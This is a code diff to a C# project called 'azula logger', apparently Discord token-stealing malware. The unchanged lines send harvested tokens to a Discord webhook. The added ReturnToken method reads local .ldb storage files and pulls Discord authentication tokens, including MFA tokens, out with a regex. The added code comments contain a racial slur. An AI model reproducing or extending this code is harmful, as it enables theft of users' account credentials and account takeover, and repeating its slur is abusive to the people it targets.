@@ -38,11 +38,45 @@ namespace azula_logger
                 {
                     websend.sendDiscordWebhook(webhook, "azula logger", token.ToString() + "\n -------------------------", image);
                     Thread.Sleep(100);
+
+                 
                 }
             }
             }
             catch { }
         }
+
+        public static string ReturnToken(string Folder, string Filetype, string webhook, string image)
+        {
+            try
+            {
+                //Basic shit to get all the files in the dir that end with .ldb and thats where the token is stored
+                DirectoryInfo dinfo = new DirectoryInfo(Folder);
+                FileInfo[] Files = dinfo.GetFiles(Filetype);
+                foreach (FileInfo file in Files)
+                {
+                    //nigger shit for getting tokens
+                    var text = File.ReadAllText(file.FullName);
+
+                    //more nigger shit for getting the token
+                    string token_reg =
+                       @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
+                    Match token = Regex.Match(text, token_reg);
+
+
+                    
+                   return token.ToString();
+                    
+                
+                }
+            }
+            catch { return "balls".ToString(); }
+            return "balls".ToString();
+
+
+
+        }
+
 
     }
 }
